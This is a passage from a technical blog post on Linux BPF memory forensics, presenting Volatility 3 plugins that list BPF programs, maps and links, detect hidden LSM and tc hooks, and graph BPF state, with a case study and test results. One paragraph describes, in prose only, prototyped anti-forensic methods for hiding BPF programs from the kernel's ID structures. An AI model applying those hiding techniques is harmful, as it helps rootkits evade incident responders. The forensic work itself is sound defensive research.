harder to strip since its needed by the BPF VM.\n# bpftool btf dump id 53 [1] PTR \u0026#39;(anon)\u0026#39; type_id=3 [2] INT \u0026#39;int\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=SIGNED [3] ARRAY \u0026#39;(anon)\u0026#39; type_id=2 index_type_id=4 nr_elems=13 [4] INT \u0026#39;__ARRAY_SIZE_TYPE__\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=(none) [5] PTR \u0026#39;(anon)\u0026#39; type_id=6 [6] TYPEDEF \u0026#39;uint64_t\u0026#39; type_id=7 [7] TYPEDEF \u0026#39;__uint64_t\u0026#39; type_id=8 [8] INT \u0026#39;unsigned long\u0026#39; size=8 bits_offset=0 nr_bits=64 encoding=(none) [9] PTR \u0026#39;(anon)\u0026#39; type_id=10 [10] TYPEDEF \u0026#39;uint32_t\u0026#39; type_id=11 [11] TYPEDEF \u0026#39;__uint32_t\u0026#39; type_id=12 [12] INT \u0026#39;unsigned int\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=(none) [13] STRUCT \u0026#39;(anon)\u0026#39; size=24 vlen=3 \u0026#39;type\u0026#39; type_id=1 bits_offset=0 \u0026#39;key\u0026#39; type_id=5 bits_offset=64 \u0026#39;value\u0026#39; type_id=9 bits_offset=128 [...] As we said earlier, links are what connects a loaded program to a point that invokes it.\n# bpftool link list [...] 3: tracing prog 22 prog_type lsm attach_type lsm_mac target_obj_id 1 target_btf_id 82856 Again, from left-to-right and top-to-bottom we have: ID, type, attached program\u0026rsquo;s ID, program\u0026rsquo;s load type, type that program was attached with, ID of the BTF object that the following field refers to, ID of the type that the program is attached to (functions can also have BTF entries). Note that everything but the first line depends on the type of link that is examined. To find the point where the program is called by the kernel we can inspect the relevant BTF object (the kernel\u0026rsquo;s in this case).\n# bpftool btf dump id 1 | rg 82856 [82856] FUNC \u0026#39;bpf_lsm_file_open\u0026#39; type_id=16712 linkage=static Thus we can conclude that the program is invoked early in the do_dentry_open function via the security_file_open LSM hook and that its return value decides whether the process will be allowed to open the file (we\u0026rsquo;re skipping some steps here, see our earlier article for the full story).\nWe performed this little \u0026ldquo;live investigation\u0026rdquo; on a laptop running Arch Linux with kernel 6.6.2-arch1-1 and the program wasn\u0026rsquo;t malware but rather loaded by systemd on boot. You can find the commit that introduced the feature here . Again, you can see that in the future there will be more legitimate BPF programs running on your systems (servers, desktops and mobiles) than you might think!\nMemory Image As a first step towards BPF memory forensics it would be nice to be able to perform the above investigation on a memory image. We will now introduce three plugins that aim to make this possible.\nWe already saw that all sorts of BPF objects are identified by an ID. Internally, these IDs are allocated using the IDR mechanism , a core kernel API. For that purpose, three variables are defined at the top of /kernel/bpf/syscall.c.\n[...] static DEFINE_IDR(prog_idr); static DEFINE_SPINLOCK(prog_idr_lock); static DEFINE_IDR(map_idr); static DEFINE_SPINLOCK(map_idr_lock); static DEFINE_IDR(link_idr); static DEFINE_SPINLOCK(link_idr_lock); [...] Under the hood, the ID allocation mechanism uses an extensible array (xarray) , a tree-like data structure that is rooted in the idr_rt member of the structure that is defined by the macro. The ID of a new object is simply an unused index into the array, and the value stored at this index is a pointer to a structure that describes it. Thus, we can re-create the listing capabilities of bpftool by simply iterating the array. You can find the code that does so in the XArray class.\nDereferencing the array entries leads us to structures that hold most of the information displayed by bpftool earlier.\nEntries of the prog_idr point to objects of type bpf_prog , the aux member of this type points to a structure that hols additional information about the program. We can see how the information bpftool displays is generated from these structures in the bpf_prog_get_info_by_fd function by filling a bpf_prog_info struct. The plugin bpf_listprogs re-implements some of the logic of this functions and displays the following pieces of information.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;NAME\u0026#34;, str), (\u0026#34;TAG\u0026#34;, str), (\u0026#34;LOADED AT\u0026#34;, int), (\u0026#34;MAP IDs\u0026#34;, str), (\u0026#34;BTF ID\u0026#34;, int), (\u0026#34;HELPERS\u0026#34;, str), ] Some comments are in order:\nOFFSET (V) are the low 6 bytes of the bpf_prog structure\u0026rsquo;s virtual address. This is useful as a unique identifier of the structure. LOADED AT is the number of nanoseconds since boot when the program was loaded. Converting it to an absolute timestamp requires parsing additional kernel time-keeping structures and is not in scope for this plugin. There exist Volatility patches that add this functionality but they are not upstream yet. Once they are, it should be trivial to convert this field to match the bpftool output. HELPERS is a field that is not reported by bpftool. It displays a list of all the kernel functions that are called by the BPF program, i.e., BPF helpers and kfuncs, and is helpful to quickly identify programs that use possibly malicious or non-standard helpers. The reporting of memory utilization is omitted as we consider it to be less important for forensic investigations, however, it would be easy to add. The second bpftool functionality the plugin supports is the dumping of programs in bytecode and jited forms. To dump the machine code of the program, we follow the bpf_func pointer in the bpf_prog structure, which points to the entrypoint of the jited BPF program. The length of the machine code is stored in the jited_len field of the same structure. While we support dumping the raw bytes to a file, their analysis is tedious due to missing symbol information. Thus, we also support disassembling the program and annotating all occurring addresses with the corresponding symbol, which makes the programs much easier to analyze.\nDumping the BPF bytecode is straightforward as well. The flexible insni array member of the bpf_prog structure holds the bytecode instructions and the len field holds their number. Here, we also support dumping the raw and disassembled bytecode. However, the additional symbol annotations are not implemented. As the bytecode is not \u0026ldquo;what actually runs\u0026rdquo;, we consider this information more susceptible to anti-forensic tampering and thus focused on the machine code, which is what is executed when invoking the program.\nNote: We use Capstone for disassembling the BPF bytecode. Unfortunately, Capstone\u0026rsquo;s BPF architecture is outdated and thus bytecode is sometimes not disassembled entirely. As a workaround, you can dump the raw bytes and use another tool to disassemble them.\nEntries of the map_idr point to bpf_map objects. The bpf_map_info structure parsed by bpftool is filled in bpf_map_get_info_by_fd and the plugin bpf_listmaps is simply copying the logic to display the following pieces of information.\ncolumns: list[tuple[str, Any]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;NAME\u0026#34;, str), (\u0026#34;KEY SIZE\u0026#34;, int), (\u0026#34;VALUE SIZE\u0026#34;, int), (\u0026#34;MAX ENTRIES\u0026#34;, int), ] Dumping the contents of maps is hard due to the diversity in map types. Each map type requires its own handling, beginning with manually downcasting the bpf_map object to the correct container type. One approach to avoid implementing each lookup mechanism separately, would be through emulation of the map_get_next_key and bpf_map_copy_value kernel functions, where the former is a function pointer found in the map\u0026rsquo;s operations structure. However, this is not in scope for the current plugin.\nFurthermore, the dumping could be enhanced by utilizing the BTF information that is optionally attached to the map to properly display keys and values, similar to the bpf_snprintf_btf helper that can be used to pretty-print objects using their BTF information.\nWe implemented the dumping for the most straightforward map type - arrays - but the plugin does not support dumping other types of maps.\nEntries of the link_idr point to objects of type bpf_link . Again, there is an informational structure, bpf_link_info , which is this time filled in the bpf_link_get_info_by_fd function. By analyzing this function, we wrote the bpf_listlinks plugin that retrieves the following pieces of information.\ncolumns: list[tuple[str, Any]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;PROG\u0026#34;, int), (\u0026#34;ATTACH\u0026#34;, str), ] Here, the last column is obtained by mimicking the virtual call to link-\u0026gt;ops-\u0026gt;fill_link_info that adds link-type specific information about the associated attachment point, e.g., for tracing links it adds the BTF object and type IDs we saw earlier.\nLSM Hooks Our three listing plugins have one conceptual weakness in common: they rely entirely on information obtained by parsing the (prog|map|link)_idrs. However, the entire ID mechanism is in the user-facing part of the BPF subsystem, its simply a means for user space to refer to BPF objects in syscalls. Thus, our plugins are susceptible to trivial anti-forensic tampering.\nIn our research, we prototyped two anti-forensic methods that remove BPF objects from these structures while still keeping the corresponding program active in the kernel. First, the more straightforward way is to simply write a kernel module that uses standard APIs to remove IDs from the IDRs. The second one is based on the observation that the lifecycle of BPF objects is managed via reference counts. Thus, if we artificially increment the reference count of an object that (indirectly) holds references to all other objects that are required to operate a BPF program, e.g., a link, we can prevent the program\u0026rsquo;s destruction when all \u0026ldquo;regular\u0026rdquo; references are dropped.\nOne approach to counter these anti-forensic measures is to \u0026ldquo;approach from the other side\u0026rdquo;. Instead of relying on information from sources that are far detached from the actual program execution, we go to the very places and mechanisms that invoke the program. The downside is obviously that this low-level code is much more program-type and architecture specific, the results, on the other hand, are more robust.\nIn a previous blog post we described the low-level details that lead up to the execution of BPF LSM programs in great detail. Based on this knowledge, we developed the bpf_lsm plugin that can discover hidden BPF programs attached to security hooks. In short, the plugin checks the places where the kernel control flow may be diverted into the BPF VM for the presence of inline hooks. If they are found, it cross checks with the links IDR to see if there is a corresponding link, the absence of which is a strong indication of tampering. Additionally, the plugin is also valuable in the absence of tampering, as it shows you the exact program attachment point without the need to manually resolve BTF IDs. In particular, the plugin displays the number of attached programs and their IDs along with the name of the LSM hook where they are attached.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;LSM HOOK\u0026#34;, str), (\u0026#34;Nr. PROGS\u0026#34;, int), (\u0026#34;IDs\u0026#34;, str), ] Networking Hooks As we described above, traffic control (tc) programs are especially useful for exfiltrating information from infected machines, e.g., by hijacking existing TCP connections. Thus, the second plugin that obtains its information from more tamper resistant sources targets tc BPF programs. It only relies on the mini_Qdisc structure that is used on the transmission and receive fast paths to look up queuing disciplines (qdisc) attached to a network device.\nWe use the ifconfig plugin by Ofek Shaked and Amir Sheffer to obtain a list of all network devices. Then, we find the above-mentioned structure and use it to collect all BPF programs that are involved into qdiscs on this device. With kernel 6.3 the process of locating the mini_Qdisc from the network interface changed slightly due to the introduction of link-based attachment of tc programs, however, the plugin recognizes and handles both cases. Finally, the bpf_netdev plugin displays the following information about each interface where at least one BPF program was found,\ncolumns: list[tuple[str, type]] = [ (\u0026#34;NAME\u0026#34;, str), (\u0026#34;MAC ADDR\u0026#34;, str), (\u0026#34;EGRESS\u0026#34;, str), (\u0026#34;INGRESS\u0026#34;, str), ] where the EGRESS and INGRESS hold the IDs of the programs that process packets flowing into the respective direction.\nFinding Processes Yet another way to discover BPF objects is through the processes that hold on to them. As with many other resources, programs, links, maps, and btf are represented to processes as file descriptors. They can be used to act on the object, retrieve information about it, and serve as a mechanism to clean up after processes that did not exit gracefully. Furthermore, an investigator might want to find out which process holds on to a specific BPF object in order to investigate this process further.\nThus, the bpf_listprocs plugin displays the following pieces of information for every process that holds on to at least one BPF object via a file descriptor.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;PID\u0026#34;, int), (\u0026#34;COMM\u0026#34;, str), (\u0026#34;PROGS\u0026#34;, str), (\u0026#34;MAPS\u0026#34;, str), (\u0026#34;LINKS\u0026#34;, str), ] Here, the PROGS. MAPS, and LINKS columns display the IDs of the respective objects. This list is generated by iterating over all file descriptors and the associated file structures. BPF objects are identified by checking the file operations f_op pointer, and the corresponding bpf_(prog|map|link) structures are found by following the pointer stored in the private member.\nNot every BPF object must be reachable from the process list, however. They can, for example, also be represented as files under the special bpf filesystem, which is usually mounted at /sys/fs/bpf, or processes can close file descriptors and the object will remain alive as long as there are other references to it.\nConnecting the Dots Finally, we would like to present the bpf_graph plugin, a meta analysis that we have build on top of the four listing plugins. As its name suggest, its goal is to visualize the state of the BPF subsystem as a graph.\nThere are four types of nodes in this graph: programs, maps, links and processes. Different node types are distinguished by shape. Within a node type, the different program/map/link types are distinguished by color and process nodes are colored based on their process ID (PID). Furthermore, map and program nodes are labeled with the ID and name of the object, link nodes are labeled with the ID and attachment information of the link, and process nodes receive the PID and comm (name of the user-space program binary) of their process as labels.\nThere are three types of edges to establish relationships between nodes: file descriptor, link, and map. File descriptor edges are dotted and connect processes to BPF objects that they have an open fd for. Link edges are dashed and connect BPF links to the program they reference. Finally, map edges are drawn solid and connect maps to all of the programs that use them.\nEspecially for large applications with hundreds or even thousands of objects, it is essential to be able to filter the graph to make it useful. We have therefore implemented two additional options that can be passed to the plugin. First, you can pass a list of node types to include in the output. Second, you can pass a list of nodes, and only the connected components that contain at least one of those nodes will be drawn.\nThe idea of this plugin is to make the information of the four listing plugins more accessible to investigators by combining it into a single picture. This is especially useful for complex applications with possibly hundreds of programs and maps, or on busy systems where many different processes have loaded BPF programs.\nPlugin output comes in two forms, a dot-format encoding of the graph, where each BPF object node has metadata containing all of the plugin columns, and as a picture of the graph, drawn with a default layout algorithm. The latter should suffice for most users, but the former allows advanced use-cases to do further processing.\nNote: We provide standalone documentation for all plugins in our project on GitHub.\nCase Study In this section we will use the plugins to examine the memory image of a system with a high level of BPF activity. To get a diverse set of small BPF applications we launched the example programs that come with libbpf-bootstrap and some of the kernel self-tests. You can download the memory image and symbols to follow along. If you prefer to analyze a single, large application have a look at the krie example in our plugin documentation .\nA good first step is to use the graph plugin to get an overview of the subsystem (# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_graph).\nAs we can see, there are several components corresponding to different processes, each of which holds a number of BPF resources. Let us begin by examining the \u0026ldquo;Hello, World\u0026rdquo; example of BPF, the minimal program:\n// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause /* Copyright (c) 2020 Facebook */ #include \u0026lt;linux/bpf.h\u0026gt; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; char LICENSE[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;Dual BSD/GPL\u0026#34;; int my_pid = 0; SEC(\u0026#34;tp/syscalls/sys_enter_write\u0026#34;) int handle_tp(void *ctx) { int pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; if (pid != my_pid) return 0; bpf_printk(\u0026#34;BPF triggered from PID %d.\\n\u0026#34;, pid); return 0; } The above source code is compiled with clang to produce an ELF relocatable object file. It contains the BPF bytecode along with additional information, like BTF sections, CORE relocations, programs as well as their attachment mechanisms and points, maps that are used and so on. This ELF is then embedded into a user space program that statically links against libbpf. At runtime, it passed the ELF to libbpf, which takes care of all the relocations and kernel interactions required to wire up the program to the BPF VM.\nWith the above C code in the back of our heads, we can now have a look at the relevant component of live system’s BPF object graph. To limit the output of the plugin to the connected components that contain certain nodes, we can add the --components flag to the invocation and give it a list of nodes (the format is \u0026lt;node_type\u0026gt;-\u0026lt;id\u0026gt; where node_type is in {map,link,prog,proc} and id is the BPF object ID or PID).\nAs we can see, the ELF has caused libbpf to create a program, two maps and a link while loading. We can now use our plugins to gather more information about each object. Let\u0026rsquo;s start with the program itself.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 98 --dump-jited --dump-xlated Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS 0xbce500673000 98 TRACEPOINT handle_tp 6a5dcef153b1001e 1417821088492 40,45 196 bpf_get_current_pid_tgid,bpf_trace_printk By looking at the last column we can see that it is indeed using two kernel helper functions, where the apparent call to bpf_printk turns out to be a macro that expands to bpf_trace_printk. If we look at the program byte and the machine code side by side, we can discover a few things.\n# cat .prog_0xbce500673000_98_bdisasm 0x0: 85 00 00 00 10 b2 02 00 call 0x2b210 0x8: 77 00 00 00 20 00 00 00 rsh64 r0, 0x20 0x10: 18 01 00 00 00 a0 49 00 00 00 00 00 e5 bc ff ff lddw r1, 0xffffbce50049a000 0x20: 61 11 00 00 00 00 00 00 ldxw r1, [r1] 0x28: 5d 01 05 00 00 00 00 00 jne r1, r0, +0x5 0x30: 18 01 00 00 10 83 83 f5 00 00 00 00 7b 9b ff ff lddw r1, 0xffff9b7bf5838310 0x40: b7 02 00 00 1c 00 00 00 mov64 r2, 0x1c 0x48: bf 03 00 00 00 00 00 00 mov64 r3, r0 0x50: 85 00 00 00 80 0c ff ff call 0xffff0c80 0x58: b7 00 00 00 00 00 00 00 mov64 r0, 0x0 0x60: 95 00 00 00 00 00 00 00 exit # cat .prog_0xbce500673000_98_mdisasm handle_tp: 0xffffc03772a0: 0f 1f 44 00 00 nop dword ptr [rax + rax] 0xffffc03772a5: 66 90 nop 0xffffc03772a7: 55 push rbp 0xffffc03772a8: 48 89 e5 mov rbp, rsp 0xffffc03772ab: e8 d0 fc aa f1 call 0xffffb1e26f80 # bpf_get_current_pid_tgid 0xffffc03772b0: 48 c1 e8 20 shr rax, 0x20 0xffffc03772b4: 48 bf 00 a0 49 00 e5 bc ff ff movabs rdi, 0xffffbce50049a000 # minimal_.bss + 0x110 0xffffc03772be: 8b 7f 00 mov edi, dword ptr [rdi] 0xffffc03772c1: 48 39 c7 cmp rdi, rax 0xffffc03772c4: 75 17 jne 0xffffc03772dd # handle_tp + 0x3d 0xffffc03772c6: 48 bf 10 83 83 f5 7b 9b ff ff movabs rdi, 0xffff9b7bf5838310 # minimal_.rodata + 0x110 0xffffc03772d0: be 1c 00 00 00 mov esi, 0x1c 0xffffc03772d5: 48 89 c2 mov rdx, rax 0xffffc03772d8: e8 13 57 a7 f1 call 0xffffb1dec9f0 # bpf_trace_printk 0xffffc03772dd: 31 c0 xor eax, eax 0xffffc03772df: c9 leave 0xffffc03772e0: c3 ret 0xffffc03772e1: cc int3 The first lesson here is probably that symbol annotations are useful :). As expected, when ignoring the prologue and epilogue inserted by the JIT-compiler, the translation between BPF and x86_64 is essentially one-to-one. Furthermore, uses of global C variables like my_pid or the format string result in direct references to kernel memory, where the closest preceding symbols are the minimal_.bss\u0026rsquo;s and minimal_.rodata\u0026rsquo;s bpf_map structures, respectively. For simple array maps, the bpf_map structure resides at the beginning of a buffer that also holds the array data, 0x110 is simply the offset at which the map\u0026rsquo;s payload data starts. More generally, libbpf will automatically create maps to hold the variables living in the .data, .rodata, and .bss sections.\nDumping the map contents confirms that the .bss map holds the minimal process\u0026rsquo;s PID while the .rodata map contains the format string.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 45 40 --dump Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES 0xbce500499ef0 40 ARRAY minimal_.bss 4 4 1 0x9b7bf5838200 45 ARRAY minimal_.rodata 4 28 1 # cat .map_0xbce500499ef0_40 {\u0026#34;0\u0026#34;: \u0026#34;section (.bss) = {\\n (my_pid) (int) b\u0026#39;\\\\xb7\\\\x02\\\\x00\\\\x00\u0026#39;\\n\u0026#34;} # cat .map_0x9b7bf5838200_45 {\u0026#34;0\u0026#34;: \u0026#34;section (.rodata) = {\\n (handle_tp.____fmt) b\u0026#39;BPF triggered from PID %d.\\\\n\\\\x00\u0026#39;\\n\u0026#34;} In the source code we saw the directive SEC(\u0026quot;tp/syscalls/sys_enter_write\u0026quot;), which instructs the compiler to place the handle_tp function\u0026rsquo;s BPF bytecode in an ELF section called \u0026quot;tp/syscalls/sys_enter_write\u0026quot;. While loading, libbpf picks this up and creates a link that attaches the program to a perf event that is activated by the sys_enter_write tracepoint. We can inspect the link, but getting more information about the corresponding trace point is not yet implemented. Contributions are always highly welcome :)\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listlinks --id 11 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE PROG ATTACH 0x9b7bc2c09ae0 11 PERF_EVENT 98 Dissecting the \u0026ldquo;Hello, World\u0026rdquo; programm was useful to get an impression of what a BPF application looks like at runtime. Before concluding this section, we will have a look at a less minimalist example, the process with PID 687.\nThis process is one of the kernel self-tests. It tests a BPF feature that allows to load new function pointer tables used for dynamic dispatch (so called structure operations), where the individual operations are implemented as BPF programs, at runtime. The programs that implement the new operations can be recognized by their type STRUCT_OPS.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 37 39 40 42 43 44 45 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS 0xbce5003b7000 37 STRUCT_OPS dctcp_init 562160e42a59841c 1417427431243 9,10,7 124 bpf_sk_storage_get,bpf_sk_storage_delete 0xbce50046b000 39 STRUCT_OPS dctcp_ssthresh cddbf7f9cf9b52d7 1417427590219 9 124 0xbce500473000 40 STRUCT_OPS dctcp_update_alpha 6e84698df8007e42 1417427647277 9 124 0xbce500487000 42 STRUCT_OPS dctcp_state dc878de7981c438b 1417427777414 9 124 0xbce500493000 43 STRUCT_OPS dctcp_cwnd_event 70cbe888b7ece66f 1417427888091 9 124 bpf_tcp_send_ack 0xbce5004e5000 44 STRUCT_OPS dctcp_cwnd_undo 78b977678332d89f 1417428066805 9 124 0xbce5004eb000 45 STRUCT_OPS dctcp_cong_avoid 20ff0d9ab24c8843 1417428109672 9 124 tcp_reno_cong_avoid The mapping between the programs and the function pointer table they implement is realized through a special map of type STRUCT_OPS created by the process.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 11 12 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES 0x9b7bc3c41000 11 STRUCT_OPS dctcp_nouse 4 256 1 0x9b7bc3c43400 12 STRUCT_OPS dctcp 4 256 1 Unfortunately, the current implementation does not parse the contents of the map, so it cannot determine the name of the kernel structure being implemented and the mapping between its member functions and the BPF programs. As always, contributions are highly welcome :). In this case, we would find out that it implements tcp_congestion_ops to load a new TCP congestion control algorithm on the fly.\nThere is a lot more to explore in this memory image, so feel free to have a closer look at the other processes. You might also want to check out the krie example in our documentation to get an impression of a larger BPF application.\nTesting We tested the plugins on memory images acquired from virtual machines running on QEMU/KVM that were suspended for the duration of the acquisition process. To ensure the correctness of all plugin results, we have cross-checked them by debugging the guest kernel as well as comparing them with bpftool running on the guest.\nBelow is a list of the distributions and releases that we used for manual testing\nDebian\n12.2.0-14, Linux 6.1.0-13 Ubuntu\n22.04.2, Linux 5.15.0-89-generic 20.04, Linux 5.4.0-26-generic Custom\nLinux 6.0.12, various configurations Linux 6.2.12, various configurations For each of these kernels, we tested at least all the plugins on an image taken during the execution of the libbpf-bootstrap example programs.\nAdditionally, to the above mentioned kernels we also developed an evaluation framework (the code is not public). The framework is based on Vagrant and libvirt /KVM . First we create and update all VMs. After that we run programs from libbpf-bootstrap with nohup so that we can leave the VM and dump the memory from outside. To dump the memory we use virsh with virsh dump \u0026lt;name of VM\u0026gt; --memory-only. virsh dump pauses the VM for a clean acquisition of the main memory. We also install debug symbols for all the Linux distributions under investigation so that we can gather the debug kernels (vmlinux with DWARF debugging information) and the System.map file. We then use both files with dwarf2json to generate the ISF information that Volatility 3 needs. Currently, we tested the following Linux distributions with their respective kernels:\nAlma Linux 9 - Linux kernel 5.14.0-362.8.1.el9_3.x86_64 ✅ Fedora 38 - Linux kernel 6.6.6-100.fc38.x86_64 ✅ Fedora 39 - Linux kernel 6.6.6-200.fc39.x86_64 ✅ CentOS Stream 9 - Linux kernel 5.14.0-391.el9.x86_64 ✅ Rocky Linux 8 - Linux kernel 4.18.0-513.9.1.el8_9.x86_64 ✅ Rocky Linux 9 - 🪲 kernel-debuginfo-common package is missing so the kernel debugging symbols cannot be installed (list of packages ) Debian 11 - Linux kernel 5.10.0-26-amd64 ✅ Debian 12 - Linux kernel 6.1.0-13-amd64 ✅ Ubuntu 22.04 - Linux kernel 5.15.0-88-generic ✅ Ubuntu 23.10 - Linux kernel 6.5.0-10-generic ✅ (works partially, but process listing is broken due to this dwarf2json GitHub Issue ) ArchLinux - Linux kernel 6.6.7-arch1-1 ✅ (works partially, but breaks probably due to the same issue as volatility3/dwarf2json GitHub Issue ) openSUSE Tumbleweed - ❓ it seems that the debug kernel that is provided by OpenSUSE does contain debugging symbols but other sections such as .rodata are removed (zeroed out) so that dwarf2json is not able to find the banner (further analyses cannot be carried out without this information) - we will further investigate this issue We will check if the problems get resolved and re-evaluate our plugin. Generally, our framework is designed to support more distributions as well and we will try to evaluate the plugin on a wider variety of them.\nDuring our automated analysis we encountered an interesting problem. To collect the kernels with debugging symbols from the VMs we need to copy them to the host. When copying the kernel executable file it will be read into main memory by the kernel\u0026rsquo;s page-cache mechanism. This implies that parts of the kernel file (vmlinux) and the kernel itself (the running kernel not the file) may be present in the dump. This can lead to the problem of the Volatility 3 function find_aslr (source code ) first finding matches in the page-cached kernel file (vmlinux) and not in the running kernel. An issue has been opened here .\nRelated Work There are several articles on BPF that cover different security-related aspects of the subsystem. In this section, we will briefly discuss the ones that are most relevant to the presented work.\nMemory Forensics: The crash utility, which is used to analyze live systems or kernel core dumps, has a bpf subcommand that can be used to display information about BPF maps and programs. However, as it is not a forensics tool it relies solely on the information obtained via the prog_idr and map_ird. Similarly, the drgn programmable debugger comes with a script to list BPF programs and maps but suffers from the same problems when it comes to anti-forensic techniques. Furthermore, drgn and crash are primarily known as debugging tools for systems developers and as such not necessarily well-established in the digital forensics and incidence response (DFIR) community. In contrast, we implemented our analyses as plugins for the popular Volatility framework well-known in the DFIR community. Finally, A. Case and G. Richard presented Volatility plugins for investigating the Linux tracing infrastructure in their BlackHat US 2021 paper . Apart from a plugin that lists programs by parsing the prog_idr, they have also implemented several plugins that can find BPF programs by analyzing the data structures of the attachment mechanisms they use, such as kprobes, tracepoints or perf events. Thus, their plugins are also able to discover inconsistencies that could reveal anti-forensic tampering. However, they have never publicly released their plugins and despite several attempts we have been unable to contact the authors to obtain a copy of the source code. Volatility already supports detecting BPF programs attached to sockets in its sockstat plugin. The displayed information is limited to names and IDs.\nReverse Engineering: Reverse engineering BPF programs is a key step while triaging the findings of our plugins. Recently, the Ghidra software reverse engineering (SRE) suite gained support for the BPF architecture , which means that its powerful decompiler can be used to analyze BPF bytecode extracted from kernel memory or user-space programs. Furthermore, BPF bytecode is oftentimes embedded into user-space programs that use framework libraries to load it into the kernel at runtime. For programs written in the Go programming language, ebpfkit-monitor can parse the binary format of these embedded files to list the defined programs and maps as well as their interactions. It uses this information to generate graphs that are similar to those of our bpf_graph plugin. Although the utility of these graphs has inspired our plugin, it is fundamentally different in that it displays information about the state of the kernel\u0026rsquo;s BPF subsystem extracted from a memory image. Consequently, it is inherently agnostic to the user-space framework that was used for compiling and loading the programs. Additionally, it displays the actual state of the BPF subsystem instead of the BPF objects that might be created by an executable at runtime.\nRuntime Protection and Monitoring: Important aspects of countering BPF malware are preventing attackers from loading malicious BPF programs and logging suspicious events for later review. krie and ebpfkit-monitor are tools that can be used to log BPF-related events as well as to deny processes access to the BPF system call.\nSimply blocking access on a per-process basis is too course-grained for many applications and thus multiple approaches were proposed to implement a more fine-grained access control model for the BPF subsystem to facilitate the realization of least privilege policies. Among those, one can further distinguish between proposals that implement access control in user space, kernel space, or a hypervisor.\nbpfman (formerly known as bpfd) is a privileged user space daemon that acts as proxy for loading BPF programs and can be used to implement different access control policies. A combination of a privileged user-space daemon and kernel changes is used in the proposed BPF token approach that allows delegation of access to specific parts of the BPF subsystem to container processes by a privileged daemon.\nA fine-grained in-kernel access control is offered by the CapBits proposed by Yi He et al. Here, two bitfields are added to the task_struct, where one defines the access that a process has to the BPF subsystem, e.g., allowed program types and helpers, and the other restricts the access that BPF programs can have on the process, e.g., to prevent it from being traced by kprobe programs. Namespaces are already used in many areas of the Linux kernel to virtualize global resources like PIDs or network devices. Thus, Y. Shao proposed introducing BPF namespaces to limit the scope of loaded programs to processes inside of the namespace. Finally, signatures over programs are a mechanism that allows the kernel to verify their provenance, which can be used analogous to module signatures that prevent attackers from loading malicious kernel modules.\nLastly, Y. Wang et al. proposed moving large parts of the BPF VM from the kernel into a hypervisor, where they implement a multi-step verification process that includes enforcing a security policy, checking signatures, and scanning for known malicious programs. In the security policy, allowed programs can be specified as a set of deterministic finite automata, which allows for accepting dynamically generated programs without allowing for arbitrary code to be loaded.\nAll these approaches are complementary to our plugins as they focus on reducing the chance that an attacker can successfully load a malicious program, while we assume that this step has already happened and aim to detect their presence.\nConclusion In this post, we gave an introduction to the Linux BPF subsystem and discussed its potential for abuse. We then presented seven Volatility plugins that allow investigators to detect BPF malware in memory images and evaluated them on multiple versions of popular Linux distributions. To conclude the post, we will briefly discuss related projects we are working on and plans for future work.\nThis project grew out of the preparation of a workshop on BPF rootkits at the DFRWS EU 2023 annual conference (materials ). We began working on this topic because we believe that the forensic community needs to expand its toolbox in response to the rise of BPF in the Linux world to fill blind spots in existing analysis methods. Additionally, investigators who may encounter BPF in their work should be made aware of the potential relevance of the subsystem to their investigation.\nWhile the workshop, our plugins, and this post are an important step towards this goal, much work remains to be done. First, in order for the present work to be useful in the real world our next goal must be to upstream most of it into the Volatility 3 project. Only this will ensure that investigators all around the world will be able to easily find and use it. This will require:\nRefactoring of our utility code to use Volatility 3\u0026rsquo;s extension class mechanism The bpf_graph plugin relies on networkx , which is not yet a dependency of Volatility 3. If the introduction of a new dependency into the upstream project is not feasible, one could make it optional by checking for the presence of the package within the plugin. Additional testing on older kernel versions and kernels with diverse configurations to meet Volatility\u0026rsquo;s high standards regarding compatibility We will be happy to work with upstream developers to make the integration happen.\nFurthermore, there remains the problem of dealing with the wide variety of map types when extracting their contents, as well as the related problem of pretty-printing them using BTF information. Here, we consider a manual implementation approach to be impractical and would explore the possibility of using emulation of the relevant functions.\nRegarding the advanced analysis aimed at countering anti-forensics, we have also implemented consistency checks against the lists of kprobes and tracepoints, but these require further work to be ready for publication. We also described additional analyses in our workshop that still need to be implemented.\nFinally, an interesting side effect of the introduction of BPF into the Linux kernel is that most of the functionality requires BTF information for the kernel and modules to be available. This provides an easy solution to the problem of obtaining type information from a raw memory image, a step that is central to automatic profile generation. We have already shown that it is possible to reliably extract BTF sections from memory images by implementing a plugin for that. We have also explored the possibility of combining this with existing approaches for extracting symbol information in order to obtain working profiles from a dump. While the results are promising, further work is needed 